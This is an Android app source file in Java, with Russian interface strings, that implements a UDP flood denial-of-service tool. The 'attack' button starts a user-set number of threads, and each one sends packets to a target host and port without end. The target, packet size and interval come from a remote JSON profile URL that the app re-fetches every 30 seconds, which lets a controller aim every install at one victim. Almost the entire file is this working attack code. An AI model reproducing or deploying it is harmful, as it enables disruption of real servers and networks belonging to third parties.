package vendicta.revolution;

import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.SeekBar;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

import static vendicta.revolution.R.layout.activity_main;

public class MainActivity extends AppCompatActivity {

    private Button profileSelector;
    private Button bAttack;
    private Button bBack;
    private Button bSave;
    private TextView textServerName;
    private TextView textServerDesc;
    private TextView textServerAddr;
    private TextView textPacketSize;
    private TextView textThreads;
    private SeekBar threadsBar;
    private TextView textInterval;
    private TextView textClientIP;
    private TextView textAttackStatus;
    private TextView textPacketsSent;
    private TextView textSourceMOTD;
    private LinearLayout layout_main;
    private LinearLayout layout_info;

    private String serverAddr;
    private int serverPort;
    private int packetSize;
    private int interval;
    private int threadCount;

    public static final String APP_PREFERENCES = "currentProfile";
    public String currentProfile;
    private SharedPreferences mSettings;

    private static final int autoUpdateTimeout = 30000;
    private static final int trafficCheckerInterval = 400;
    private long packetsSent = 0;
    private boolean isAttacking = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(activity_main);

        profileSelector = (Button) findViewById(R.id.profileSelector);
        bAttack = (Button) findViewById(R.id.bAttack);
        bBack = (Button) findViewById(R.id.bBack);
        bSave = (Button) findViewById(R.id.bSave);
        textServerName = (TextView) findViewById(R.id.textServerName);
        textServerDesc = (TextView) findViewById(R.id.textServerDesc);
        textServerAddr = (TextView) findViewById(R.id.textServerAddr);
        textPacketSize = (TextView) findViewById(R.id.textPacketSize);
        textThreads = (TextView) findViewById(R.id.textThreads);
        threadsBar = (SeekBar) findViewById(R.id.threadsBar);
        textInterval = (TextView) findViewById(R.id.textInterval);
        textClientIP = (TextView) findViewById(R.id.textClientIP);
        textAttackStatus = (TextView) findViewById(R.id.textAttackStatus);
        textPacketsSent = (TextView) findViewById(R.id.textPacketsSent);
        textSourceMOTD = (TextView) findViewById(R.id.textSourceMOTD);
        layout_main = (LinearLayout) findViewById(R.id.layout_main);
        layout_info = (LinearLayout) findViewById(R.id.layout_info);

        mSettings = getSharedPreferences(APP_PREFERENCES, Context.MODE_PRIVATE);

        final Handler actionHandler = new Handler() {
            public void handleMessage(Message msg) {
                try {
                    getRequest(currentProfile);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        };

        threadsBar.setOnSeekBarChangeListener(
                new SeekBar.OnSeekBarChangeListener() {
                    @Override
                    public void onProgressChanged(SeekBar seekBar, int progressValue, boolean fromUser) {
                        threadCount = progressValue;
                        textThreads.setText(getResources().getString(R.string.threads) + threadCount);

                        if (seekBar.getProgress() < 1)
                            seekBar.setProgress(1);
                    }

                    public void onStartTrackingTouch(SeekBar seekBar) {}

                    public void onStopTrackingTouch(SeekBar seekBar) {}
                });

        Thread autoUpdate = new Thread (new Runnable() {
            @Override
            public void run() {
                //noinspection InfiniteLoopStatement
                while (true){
                    try {
                        Thread.sleep(autoUpdateTimeout);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    actionHandler.sendMessage(actionHandler.obtainMessage());
                }
            }
        });
        autoUpdate.start();

        final Handler trafficUIUpdateHandler = new Handler() {
            public void handleMessage(Message msg) {
                textPacketsSent.setText(getResources().getString(R.string.packetsSent) + packetsSent);
            }
        };

        Thread trafficUIUpdater = new Thread (new Runnable() {
            @Override
            public void run() {
                //noinspection InfiniteLoopStatement
                while (true){
                    try {
                        Thread.sleep(trafficCheckerInterval + interval);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    trafficUIUpdateHandler.sendMessage(trafficUIUpdateHandler.obtainMessage());
                }
            }
        });
        trafficUIUpdater.start();

        try {
            loadProfile();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onStop() {
        super.onStop();
        SharedPreferences.Editor editor = mSettings.edit();
        editor.putInt("threadCount", threadCount);
        editor.apply();
    }

    public void bAttackClick(View view) throws IOException {
        isAttacking = !isAttacking;
        if (isAttacking) {
            updateUI("attacking");
            attack("UDP");
        }
        else
            updateUI("notAttacking");
    }

    public void attack(String method) {

        for (int i = 0; i <= threadCount; i++) {
            Thread background = new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        DatagramSocket clientSocket = new DatagramSocket();
                        InetAddress IPAddress = InetAddress.getByName(serverAddr);
                        byte[] sendData = new byte[packetSize];

                        //noinspection InfiniteLoopStatement
                        while (true) {
                            DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length, IPAddress, serverPort);
                            if (interval > 0)
                                Thread.sleep(interval);
                            clientSocket.send(sendPacket);
                            packetsSent++;

                            if (!isAttacking) {
                                packetsSent = 0;
                                clientSocket.close();
                                return;
                            }
                        }
                    } catch (IOException | InterruptedException ignored) {}
                }
            });
            background.start();
        }
    }

    public void updateUI(String mode) {
        switch (mode) {
            case "default": {
                textServerName.setText(getResources().getString(R.string.name));
                textServerDesc.setText(getResources().getString(R.string.desc));
                textServerAddr.setText(getResources().getString(R.string.addr));
                textPacketSize.setText(getResources().getString(R.string.packetSize));
                textInterval.setText(getResources().getString(R.string.interval));
                textClientIP.setText(getResources().getString(R.string.clientIP)+ "127.0.0.1");
                textAttackStatus.setText(getResources().getString(R.string.attackStatus) + "Не выполняется");
                textPacketsSent.setText(getResources().getString(R.string.packetsSent) + packetsSent);
                textSourceMOTD.setText(null);
                break;
            }

            case "attacking": {
                bAttack.setText(getResources().getString(R.string.stopAttack));
                textAttackStatus.setText(getResources().getString(R.string.attackStatus) + "Выполняется");
                profileSelector.setEnabled(false);
                threadsBar.setEnabled(false);
                bSave.setEnabled(false);
                break;
            }

            case "notAttacking": {
                bAttack.setText(getResources().getString(R.string.attack));
                textAttackStatus.setText(getResources().getString(R.string.attackStatus) + "Не выполняется");
                profileSelector.setEnabled(true);
                threadsBar.setEnabled(true);
                bSave.setEnabled(true);
                break;
            }
        }
    };

    public void bApplyClick(View view) throws JSONException, IOException {
        SharedPreferences.Editor editor = mSettings.edit();
        currentProfile = String.valueOf(profileSelector.getText());
        editor.putString("currentProfile", currentProfile);
        editor.apply();
        getRequest(currentProfile);
        Toast.makeText(getApplicationContext(), "Успешно сохранено", Toast.LENGTH_SHORT).show();
    }

    public void bProfileClick(View view) {

        LayoutInflater li = LayoutInflater.from(this);
        View promptsView = li.inflate(R.layout.alert_dialog, null);
        AlertDialog.Builder mDialogBuilder = new AlertDialog.Builder(this);
        mDialogBuilder.setView(promptsView);
        final EditText userInput = promptsView.findViewById(R.id.input_text);
        userInput.setText(profileSelector.getText());

        mDialogBuilder
                .setCancelable(true)
                .setPositiveButton("OK",
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog,int id) {
                                profileSelector.setText(userInput.getText());
                            }
                        })
                .setNegativeButton("Отмена",
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog,int id) {
                                dialog.cancel();
                            }
                        });

        AlertDialog alertDialog = mDialogBuilder.create();
        alertDialog.show();
    }

    // сокрытие основного меню и показ информации
    public void bInfoClick(View view) {

        layout_main.setAlpha(0f);
        layout_main.setEnabled(false);
        layout_info.setAlpha(1f);
        layout_info.setEnabled(true);
        layout_info.bringToFront();
        layout_info.invalidate();
    }

    // сокрытие информации и показ основного меню
    public void bBackLayoutInfoClick(View view) {

        layout_main.setAlpha(1f);
        layout_main.setEnabled(true);
        layout_info.setAlpha(0f);
        layout_info.setEnabled(false);
        layout_main.bringToFront();
        layout_main.invalidate();
    }

    void loadProfile() throws IOException {
        currentProfile = mSettings.getString("currentProfile", getResources().getString(R.string.standart));
        threadCount = mSettings.getInt("threadCount", 4);
        threadsBar.setProgress(threadCount);
        textThreads.setText(getResources().getString(R.string.threads) + threadCount);

        if (currentProfile != "") {
            profileSelector.setText(currentProfile);
            getRequest(currentProfile);
        } else
            profileSelector.setText(getResources().getString(R.string.standart));
    }

    void getRequest(String url) throws IOException {

        Request request;
        try {
            request = new Request.Builder()
                    .url(url)
                    .build();
        } catch (Exception e) {
            return;
        }

        assert request != null;
        OkHttpClient client = new OkHttpClient();
        client.newCall(request)
                .enqueue(new Callback() {
                    @Override
                    public void onFailure(@NonNull final Call call, IOException e) {
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                Toast.makeText(getApplicationContext(), "Ошибка подключения", Toast.LENGTH_SHORT).show();
                            }
                        });
                    }

                    @Override
                    public void onResponse(@NonNull Call call, @NonNull final Response response) throws IOException {
                        final String res = response.body().string();
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                try {
                                    dataProcessing(res);
                                } catch (JSONException e) {
                                    setDefaultData();
                                }
                            }
                        });
                    }
                });
    }

    private void dataProcessing(String rawJson) throws JSONException {
        JSONObject json = new JSONObject(rawJson);
        String serverName = json.getString("name");
        String serverDesc = json.getString("desc");
        serverAddr = json.getString("addr");
        serverPort = json.getInt("port");
        packetSize = json.getInt("packetSize");
        interval = json.getInt("interval");
        String sourceMotd = json.getString("motd");

        textServerName.setText(getResources().getString(R.string.name) + serverName);
        textServerDesc.setText(getResources().getString(R.string.desc) + serverDesc);
        textServerAddr.setText(getResources().getString(R.string.addr) + serverAddr+":"+serverPort);
        textPacketSize.setText(getResources().getString(R.string.packetSize) + packetSize);
        textInterval.setText(getResources().getString(R.string.interval) + interval);
        textClientIP.setText(getResources().getString(R.string.clientIP)+ "127.0.0.1");
        textPacketsSent.setText(getResources().getString(R.string.packetsSent) + packetsSent);
        textSourceMOTD.setText(sourceMotd);
    }

    private void setDefaultData() {
        serverAddr = null;
        serverPort = 80;
        packetSize = 1024;
        interval = 0;
        packetsSent = 0;

        updateUI("default");
    }
}
